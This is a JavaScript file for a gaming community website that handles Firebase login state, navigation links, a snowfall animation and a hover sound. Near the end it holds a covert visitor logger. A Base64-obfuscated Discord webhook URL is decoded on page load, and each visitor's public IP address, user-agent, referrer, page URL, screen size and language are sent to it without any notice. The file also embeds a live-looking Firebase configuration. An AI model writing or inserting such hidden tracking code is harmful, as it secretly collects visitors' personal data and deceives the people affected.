// --- Firebase Initialization and Imports ---
import { initializeApp, getApps, getApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";
import { getFirestore, doc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
// If you use analytics, uncomment the next line
// import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-analytics.js";

// Your web app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyA7DEECNxcGlYdNkPLEz4K9Q_wrM9-HVMc",
    authDomain: "icemc-site.firebaseapp.com",
    projectId: "icemc-site",
    storageBucket: "icemc-site.firebasestorage.app",
    messagingSenderId: "748723124144",
    appId: "1:748723124144:web:a3d9a13a4b44f7475d0875",
    measurementId: "G-8QNKHEMJQE"
};

// Initialize Firebase only if no app is already initialized
let app;
if (!getApps().length) { // Check if any Firebase app has been initialized
    app = initializeApp(firebaseConfig);
} else {
    app = getApp(); // Get the already initialized app instance
}

const auth = getAuth(app); // Get the Auth service
const db = getFirestore(app); // Get the Firestore service
// If you use analytics, uncomment the next line
// const analytics = getAnalytics(app);

// --- DOMContentLoaded Listener for all page-specific setup ---
document.addEventListener('DOMContentLoaded', () => {

    // --- Authentication State Listener ---
    onAuthStateChanged(auth, async (user) => { // Made async to use await for Firestore
        const loginLink = document.getElementById('loginLink');
        const registerLink = document.getElementById('registerLink');
        const profileLink = document.getElementById('profileLink');
        const settingsLink = document.getElementById('settingsLink'); // New
        const logoutLink = document.getElementById('logoutLink');

        if (user) {
            // User is signed in.
            // console.log('User logged in:', user.email);

            // Fetch user's custom profile data (like webName) from Firestore
            const userDocRef = doc(db, "users", user.uid);
            const userDocSnap = await getDoc(userDocRef);

            let webName = user.email.split('@')[0]; // Default to email prefix
            if (userDocSnap.exists()) {
                const userData = userDocSnap.data();
                if (userData.webName) {
                    webName = userData.webName;
                }
            } else {
                // If user profile doesn't exist in Firestore (should be created on register),
                // create it here with a default webName. This is a fallback.
                await setDoc(userDocRef, {
                    uid: user.uid,
                    email: user.email,
                    webName: webName, // Initial web name from email prefix
                    createdAt: new Date()
                }).catch(error => console.error("Error creating user doc:", error));
            }

            // Update navigation
            if (loginLink) loginLink.style.display = 'none';
            if (registerLink) registerLink.style.display = 'none';
            if (profileLink) {
                profileLink.style.display = 'inline-block';
                profileLink.textContent = `${webName} Профил`; // Display web name
                profileLink.href = 'profile.html';
            }
            if (settingsLink) settingsLink.style.display = 'inline-block'; // Show settings link
            if (logoutLink) logoutLink.style.display = 'inline-block';
        } else {
            // User is signed out.
            // console.log('User logged out');
            if (loginLink) loginLink.style.display = 'inline-block';
            if (registerLink) registerLink.style.display = 'inline-block';
            if (profileLink) profileLink.style.display = 'none';
            if (settingsLink) settingsLink.style.display = 'none'; // Hide settings link
            if (logoutLink) logoutLink.style.display = 'none';
        }
    });

    // --- Logout Functionality ---
    const logoutLink = document.getElementById('logoutLink');
    if (logoutLink) {
        logoutLink.addEventListener('click', async (e) => {
            e.preventDefault();
            try {
                await signOut(auth); // Use signOut from modular SDK
                console.log('User signed out successfully.');
                // Redirect to home page or login page after logout
                window.location.href = 'index.html';
            } catch (error) {
                console.error('Logout error:', error.message);
                // Instead of alert, you might want a custom message box or just console log
                // alert('Грешка при изход: ' + error.message);
            }
        });
    }

    // --- Snowflake Animation ---
    const snowflakesContainer = document.getElementById('snowflakes-container');
    if (snowflakesContainer) {
        const numberOfSnowflakes = 50; // Adjust for more/less snow

        function createSnowflake() {
            const snowflake = document.createElement('div');
            snowflake.classList.add('snowflake');

            const size = Math.random() * 5 + 2; // Snowflake size between 2px and 7px
            snowflake.style.width = `${size}px`;
            snowflake.style.height = `${size}px`;

            snowflake.style.left = `${Math.random() * 100}vw`; // Random horizontal start
            
            const fallDuration = Math.random() * 8 + 5; // 5 to 13 seconds
            const fallDelay = Math.random() * 5; // 0 to 5 seconds delay
            snowflake.style.animationDuration = `${fallDuration}s`;
            snowflake.style.animationDelay = `${fallDelay}s`;

            snowflakesContainer.appendChild(snowflake);
        }

        for (let i = 0; i < numberOfSnowflakes; i++) {
            createSnowflake();
        }
    } else {
        // console.warn("Snowflakes container with ID 'snowflakes-container' not found. Snowflake animation might not work as expected.");
    }

    // --- Navigation Hover Sound ---
    const navLinks = document.querySelectorAll('.menu a'); // Target links within your '.menu' class
    const hoverSound = document.getElementById('hoverSound'); // This ID needs to be on an <audio> tag in your HTML

    if (hoverSound) { // Check if the audio element exists on the current page
        navLinks.forEach(link => {
            link.addEventListener('mouseenter', () => {
                // Check if audio is ready enough and not currently playing
                if (hoverSound.readyState >= 2 && hoverSound.paused) {
                    hoverSound.currentTime = 0; // Reset to start
                    hoverSound.play().catch(error => console.log("Audio play failed (user gesture required):", error));
                }
            });
        });
    } else {
        // console.warn("Audio element with ID 'hoverSound' not found. Navigation hover sound will not play.");
    }

    // --- Webhook Configuration ---
    // Your Base64 encoded webhook URL.
    const obfuscatedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MjYzNjQxODg5OTQ0NzgwOC9RUGRvUEJFX1ppaFBzSXN3enZNdUNDUWRGMmcySjMzNXFlbmpIWWVhdlZibXRpTlhXUjE4bEtrVk05MjREUVZzTEc1Zg==";
    const siteName = "icemc.site"; // Define your site name here for consistent use
    const siteLogoUrl = `${window.location.origin}/logoo.png`; // Assumes logoo.png is at the root

    // --- IP Logging Function ---
    async function sendIpToWebhook() {
        if (sessionStorage.getItem('ipWebhookSent_icemc')) {
            // console.log('IP webhook already sent this session.');
            return;
        }

        try {
            // Introduce a small delay before the first network request to prevent immediate lag
            await new Promise(resolve => setTimeout(resolve, 50)); // Pause for 50 milliseconds

            // 1. Get the public IP address using an external service
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (!ipResponse.ok) {
                console.error('IP Logger: Failed to fetch IP address:', ipResponse.statusText);
                return;
            }
            const ipData = await ipResponse.json();
            const publicIp = ipData.ip;

            // This is a generic placeholder string for the check, not your actual webhook.
            const placeholderForCheck = "YOUR_BASE64_ENCODED_WEBHOOK_URL_PLACEHOLDER"; // A generic placeholder string for the check

            // Check if the webhook URL is empty or still a placeholder
            if (obfuscatedWebhookUrl.trim() === "" || obfuscatedWebhookUrl === placeholderForCheck) {
                console.error("IP Logger: Webhook URL is not configured or is still a placeholder. Please set the correct Base64 encoded webhook URL in scripts.js.");
                return; 
            }
            let webhookUrl;
            try {
                webhookUrl = atob(obfuscatedWebhookUrl); // atob() decodes Base64
            } catch (e) {
                console.error("IP Logger: Failed to decode webhook URL. Is it correctly Base64 encoded?", e);
                return; 
            }

            // Introduce another small delay before sending to the webhook
            await new Promise(resolve => setTimeout(resolve, 50)); // Pause for another 50 milliseconds

            // 3. Prepare the data to send with an embed
            const payload = {
                username: `${siteName} Visitor Monitor`,
                avatar_url: siteLogoUrl,
                embeds: [{
                    title: `❄️ New Visitor to ${siteName}!`,
                    description: `A new user has landed on the site.`,
                    color: 0x75CAEB, // A light icy blue color (hex 75CAEB)
                    fields: [
                        { name: "👤 IP Address", value: `\`${publicIp}\``, inline: true },
                        { name: "🕒 Client Timestamp", value: new Date().toLocaleString(), inline: true },
                        { name: "🌐 Current Page", value: `\`${window.location.href}\``, inline: false },
                        { name: " GOTO Referrer", value: `\`${document.referrer || 'Direct visit or N/A'}\``, inline: false },
                        { name: "💻 User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
                        { name: "🖥️ Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
                        { name: "🗣️ Browser Language", value: navigator.language, inline: true }
                    ],
                    footer: {
                        text: `${siteName} Visitor Log`,
                        icon_url: siteLogoUrl
                    },
                    timestamp: new Date().toISOString() // ISO 8601 timestamp for Discord's native timestamp display
                }]
            };

            // 4. Send the data to the webhook
            const webhookResponse = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            });

            if (!webhookResponse.ok) {
                console.error('IP Logger: Failed to send data to webhook:', webhookResponse.status, webhookResponse.statusText);
            } else {
                // console.log('IP Logger: Data sent to webhook successfully.');
                sessionStorage.setItem('ipWebhookSent_icemc', 'true'); // Mark as sent for this session
            }
        } catch (error) {
            console.error('IP Logger: Error in sendIpToWebhook:', error);
        }
    }

    // --- Test Command Function for Developer Console ---
    async function sendTestMessageToWebhook() {
        console.log("Attempting to send test message...");
        const placeholderForCheck = "YOUR_BASE64_ENCODED_WEBHOOK_URL_PLACEHOLDER";

        if (obfuscatedWebhookUrl.trim() === "" || obfuscatedWebhookUrl === placeholderForCheck) {
            const errorMsg = "Test Command: Webhook URL is not configured or is still a placeholder. Please set it in scripts.js.";
            console.error(errorMsg);
            return errorMsg;
        }

        let webhookUrl;
        try {
            webhookUrl = atob(obfuscatedWebhookUrl);
        } catch (e) {
            const errorMsg = "Test Command: Failed to decode webhook URL. Is it correctly Base64 encoded?";
            console.error(errorMsg, e);
            return errorMsg;
        }

        const payload = {
            username: `${siteName} Test System`,
            avatar_url: siteLogoUrl,
            embeds: [{
                title: "🔧 Webhook Test Message",
                description: `This is a test message triggered from the developer console for **${siteName}**. If you see this, the webhook is working!`,
                color: 0xFFA500, // Orange color for test messages
                fields: [
                    { name: "✅ Status", value: "Test successful!", inline: true },
                    { name: "🕒 Client Timestamp", value: new Date().toLocaleString(), inline: true }
                ],
                footer: {
                    text: `${siteName} Test Utility`,
                    icon_url: siteLogoUrl
                },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            });

            if (!response.ok) {
                const errorText = await response.text();
                console.error('Test Command: Failed to send test message:', response.status, response.statusText, errorText);
                return `Test failed: HTTP ${response.status} - ${response.statusText}. Details: ${errorText}`;
            } else {
                console.log('Test Command: Test message sent successfully to webhook.');
                return "Test message sent successfully!";
            }
        } catch (error) {
            console.error('Test Command: Error sending test message:', error);
            return `Test failed: ${error.message}`;
        }
    }

    // --- Expose functions to the window object for console access ---
    window.web = {
        test: sendTestMessageToWebhook,
        // You could also expose sendIpToWebhook for testing, but be mindful of session storage
        // testIpLog: () => {
        //     sessionStorage.removeItem('ipWebhookSent_icemc'); // Temporarily bypass session lock for testing
        //     console.log("Attempting to send IP log via web.testIpLog()...");
        //     return sendIpToWebhook(); // Return the promise
        // }
    };

    // Call the IP logging function when the page loads.
    sendIpToWebhook();
});
